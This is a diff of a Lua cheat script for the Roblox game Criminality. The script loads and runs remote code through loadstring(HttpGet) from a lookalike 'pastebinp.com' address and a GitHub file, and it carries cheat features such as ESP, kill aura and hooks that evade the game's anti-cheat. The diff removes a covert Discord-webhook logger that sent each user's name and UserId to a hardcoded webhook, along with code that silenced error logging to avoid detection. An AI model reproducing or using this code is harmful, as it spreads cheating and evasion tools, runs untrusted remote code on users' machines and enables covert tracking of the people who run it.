@@ -1,3 +1,6 @@
+
+wait(2)
+
 local Framework = loadstring(game:HttpGet("https://pastebinp.com/raw/KP1dUHFg"))()
 local CoolDowns = { AutoPickUps = { MoneyCooldown = false, ScrapCooldown = false, ToolCooldown = false } }
 local ESPSettings = { PlayerESP = { Enabled = false, TracersOn = false, BoxesOn = false, NamesOn = false, DistanceOn = false, HealthOn = false, ToolOn = false, FaceCamOn = false, Distance = 2000 }, ScrapESP = { Enabled = false, Distance = 2000, LegendaryOnly = true, RareOnly = true, GoodOnly = true, BadOnly = true }, SafeESP = { Enabled = false, Distance = 2000, BigOnly = true, SmallOnly = true }, RegisterESP = { Enabled = false, Distance = 2000 }, ESPColor = Color3.fromRGB(255, 255, 255), ToolColor = Color3.fromRGB(255, 255, 255)};
@@ -7,34 +10,92 @@ local Watermark = Framework:CreateWatermark("ELITE | {game} | {fps}")
 local WriteLine = Framework:CreateWindow("Elite - Criminality", Vector2.new(492, 588), Enum.KeyCode.RightControl)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NougatBitz/BitzUtils/main/CriminalityFeatures.lua"))()
 
---die :DDDDD
-
-_G.AccentColors = {
-    Accent1 = Color3.fromRGB(24, 117, 255),
-    Accent2 = Color3.fromRGB(18, 92, 202)
-}
 
 
-function IFUCKINGHATEELITE()
-	syn.request({
-		Url = "https://discord.com/api/webhooks/983442244927381554/5Ih0TrQPsjj9I4zADeHpSberCD8e26ycHujCbYreYlc7LvPIys3tbrAhZPX3OwwjytpZ",
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json",
-		},
-		Body = game:GetService("HttpService"):JSONEncode({
-			embeds = {
-				{
-					["title"] = "Execution Log",
-					["description"] = "**Name :**\n" .. "```" .. game:GetService("Players").LocalPlayer.Name .. "```" .. "\n**UserId :** \n".. "```" .. game:GetService("Players").LocalPlayer.UserId .. "```",
-					["color"] = tonumber(0xFFFAFA),
-				},
-			},
-		}),
-	})
-end
 
-IFUCKINGHATEELITE()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -215,15 +276,6 @@ function Notify(msg)
 -->> End Noti
 
 -->> Important
-game:GetService("RunService").RenderStepped:Connect(function()
-    for _, Connection in next, getconnections(game:GetService("ScriptContext").Error) do
-        Connection:Disable()
-    end
-
-    for _, Connection in next, getconnections(game:GetService("LogService").MessageOut) do
-        Connection:Disable()
-    end
-end)
 
 
 for i,v in pairs(getgc(true)) do
@@ -241,34 +293,7 @@ end
 -->> End Important
 
 -->> Anti stuff
-local MT = getrawmetatable(game)
-		setreadonly(MT, false)
-		local NameCall = MT.__namecall
 
-		MT.__namecall = newcclosure(function(self, ...)
-			local Method = getnamecallmethod()
-			local Args = {...}
-
-			if Method == "FireServer" and Args[1] == "BHHh" then
-				if Settings.NoBarbwire == true then
-					return wait(9e9)
-				end
-			elseif Method == "FireServer" and Args[1] == "FlllD" or Args[1] == "FlllH" then
-				if Settings.NoFallDamage == true then
-					return wait(9e9)
-				end
-			elseif Method == "FireServer" and Args[1] == "__--r" or Args[1] == "HITRGP" then
-				if Settings.NoRagdoll == true then
-					return wait(9e9)
-				end
-			elseif Method == "FireServer" and Args[1] == "FllH" then
-				if Settings.NoDowned == true then
-					return wait(9e9)
-				end
-			end
-
-			return NameCall(self, ...)
-		end)
 -->> End anti stuff
 
 -->> Noclip Bypass
@@ -288,15 +313,7 @@ end)
 
 setreadonly(mt, true)
 
-		game:GetService("RunService").RenderStepped:Connect(function()
-			for _, Connection in next, getconnections(game:GetService("ScriptContext").Error) do
-				Connection:Disable()
-			end
 
-			for _, Connection in next, getconnections(game:GetService("LogService").MessageOut) do
-				Connection:Disable()
-			end
-		end)
 -->> End Noclip Bypass
 
 local Main = General:CreateSector("Player", "left")
@@ -500,27 +517,7 @@ Main:AddToggle("Anti Ragdoll", Settings.NoRagdoll, function(v)
     Settings.NoRagdoll = v
 end)
 
-Main:AddToggle("Anti Fall Damage", false, function(v)
-    _G.NoFallDamage = v
-    local OldNameCall = nil
-    OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
-        if not checkcaller() and getnamecallmethod() == "FireServer" and Self.Name == "__DFfDD" and _G.NoFallDamage then
-            return
-        end
-        return OldNameCall(Self, ...)
-    end)
-end)
 
-Main:AddToggle("Anti Wire Damage", false, function(v)
-    _G.NoBarbRagdollFallDamage = v
-    local OldNameCall = nil
-    OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
-        if not checkcaller() and getnamecallmethod() == "FireServer" and Self.Name == "BHHh" and _G.NoBarbRagdollFallDamage then
-            return
-        end
-        return OldNameCall(Self, ...)
-    end)
-end)
 
 Main:AddToggle("Anti Flash Bang", false, function(v)
     _G.NoFlashBang = v
@@ -870,43 +867,7 @@ Main2:AddToggle("Kill Aura", false, function(v)
     KillAuraEnabled = v
 end)
 
-Main2:AddToggle("Hitbox Extender", false, function(v)
-    _G.HBE = v
-    _G.HBE_Size = (_G.HEADSIZE)
 
-local head_size = game.Players.LocalPlayer.Character:FindFirstChild("Head").Size
-
-game:GetService("RunService").Heartbeat:connect(function()
-    for i, v in next, game:GetService("Players"):GetPlayers() do
-        if v.Name ~= game:GetService("Players").LocalPlayer.Name then
-            pcall(function()
-                if _G.HBE then
-                    v.Character.Head.Size = Vector3.new(_G.HBE_Size, _G.HBE_Size, _G.HBE_Size)
-                    v.Character.Head.Transparency = 0.8
-                else
-                    v.Character.Head.Size = head_size
-                    v.Character.Head.Transparency = 0
-                end
-            end)
-        end
-    end
-end)
-
-local old
-
-old = hookmetamethod(game,"__index",function(self,index)
-    if index == "Size" and not checkcaller() then
-        if old(self,"Name") == "Head" then
-            return head_size
-        end
-    end
-    return old(self,index)
-end)
-end)
-
-Main2:AddSlider("Slider", 1, 1, 6, 1, function(v)
-    _G.HEADSIZE = v
-end)
 
 
 Main3:AddDropdown("Hit Sounds", {"Boink", "TF2", "Rust", "CSGO", "Hitmarker"}, "Boink", false, function(V)
